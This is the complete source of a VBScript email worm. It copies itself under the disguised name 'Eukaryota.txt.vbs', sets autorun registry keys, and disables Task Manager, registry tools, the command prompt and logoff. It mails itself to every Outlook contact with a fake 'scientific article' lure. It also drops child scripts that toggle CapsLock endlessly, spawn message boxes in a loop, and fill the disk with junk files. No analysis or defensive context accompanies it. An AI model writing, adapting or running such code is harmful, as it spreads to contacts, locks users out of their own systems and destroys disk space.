On Error Resume Next

Dim fso, Shell
Set fso = CreateObject("Scripting.FileSystemObject")
Set Shell = CreateObject("WScript.Shell")


DropFiles
Registry
SendMail

MsgBox "Lorem Ipsum Dolor Sit Amet. B)", 48, "Error!"


' ------ Subs ------ '
Sub Registry		
	Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Ascaris Lumbricoides", "REG_SZ"
	Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Animalia", "REG_SZ"
	Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "Back to Windows 95!", "REG_SZ"

	Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
	Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff", 1, "REG_DWORD"
	Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
	Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
	Shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
	Shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
	Shell.RegWrite "HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD", 1, "REG_DWORD"

	Shell.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "https://en.wikipedia.org/wiki/Ascaris_lumbricoides", "REG_SZ"
	
	' This force the group policy to update
	Shell.Run "SECEDIT /REFRESHPOLICY MACHINE_POLICY /ENFORCE"
End Sub

Sub SendMail
	Dim Outlook, MAPI, Mail, AddrBook
	
	Set Outlook = WScript.CreateObject("Outlook.Application")
	Set MAPI = Outlook.GetNamespace("MAPI")


	For Lists = 1 to MAPI.AddressLists.Count
		Set AddrBook = MAPI.AddressLists(Lists)
		
		for Contacts = 1 to AddrBook.AddressEntries.Count
			Set Mail = Outlook.CreateItem(0)
			
			Mail.to = AddrBook.AddressEntries(Contacts)
			Mail.Subject = "You know about this?"
			Mail.Body = "Hey, i'm sending this file for you. It's a scientific article about the Eukaryotes. Take a look!"
			Mail.Attachments.Add("C:\WINNT\SYSTEM\Eukaryota.txt.vbs")
			Mail.send
			
			Set Mail = Nothing
		Next
	Next
End Sub

Sub DropFiles
	Dim File
	
	' Copy worm file
	If Not fso.FileExists("C:\WINNT\SYSTEM\Eukaryota.txt.vbs") Then
		
		fso.CopyFile WScript.ScriptFullName, "C:\WINNT\SYSTEM\Eukaryota.txt.vbs"
		Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Nematoda", "C:\WINNT\SYSTEM\Eukaryota.txt.vbs", "REG_SZ"
	
	End If
	
	' ------ The CHILDS ------
	
	If Not fso.FileExists("C:\WINNT\TEMP\k.vbs") Then
		
		Set File = fso.CreateTextFile("C:\WINNT\TEMP\k.vbs", True)
		File.WriteLine("Dim Shell : Set Shell = CreateObject(""WScript.Shell"") : While True : Shell.SendKeys ""{CAPSLOCK}"" : WScript.Sleep 200 : Wend")
		File.Close
		
		Shell.Run "C:\WINNT\TEMP\k.vbs", 0
		Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\child1", "C:\WINNT\TEMP\k.vbs", "REG_SZ"
		
	End If
	
	If Not fso.FileExists("C:\WINNT\Web\Wallpaper\b.vbs") Then
		
		Set File = fso.CreateTextFile("C:\WINNT\Web\Wallpaper\b.vbs", True)
		File.WriteLine("Dim Shell : Set Shell = CreateObject(""WScript.Shell""): While True : MsgBox ""B)"" : Shell.Run ""C:\WINNT\Web\Wallpaper\b.vbs"", 0 : Wend")
		File.Close
		
		Shell.Run "C:\WINNT\Web\Wallpaper\b.vbs", 0
		Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\child2", "C:\WINNT\Web\Wallpaper\b.vbs", "REG_SZ"
	
	End If
	
	If Not fso.FileExists("C:\WINNT\d.vbs") Then
		
		Set File = fso.CreateTextFile("C:\WINNT\d.vbs", True)
		File.WriteLine("Dim fso, File, i, FileTypes : Randomize : Set fso = CreateObject(""Scripting.FileSystemObject"") : FileTypes = Array("".vbs"", "".exe"", "".txt"", "".mp3"", "".mp4"", "".jpg"", "".png"", "".pdf"", "".pptx"", "".doc"") : i = 0 : While (True) : Set File = fso.CreateTextFile(""C:\WINNT\"" & i & FileTypes(Int((10 * Rnd) + 0)), True) : File.WriteLine ""BlobnonsenseBlobnonsenseBlobnonsenseBlobnonsenseBlobnonsenseBlobnonsenseBlobnonsenseBlobnonsenseBlobnonsense..."" : File.Close : i = i + 1 : Wend")
		File.Close
		
		Shell.Run "C:\WINNT\d.vbs", 0
		Shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\child3", "C:\WINNT\d.vbs", "REG_SZ"
	
	End If 
End Sub
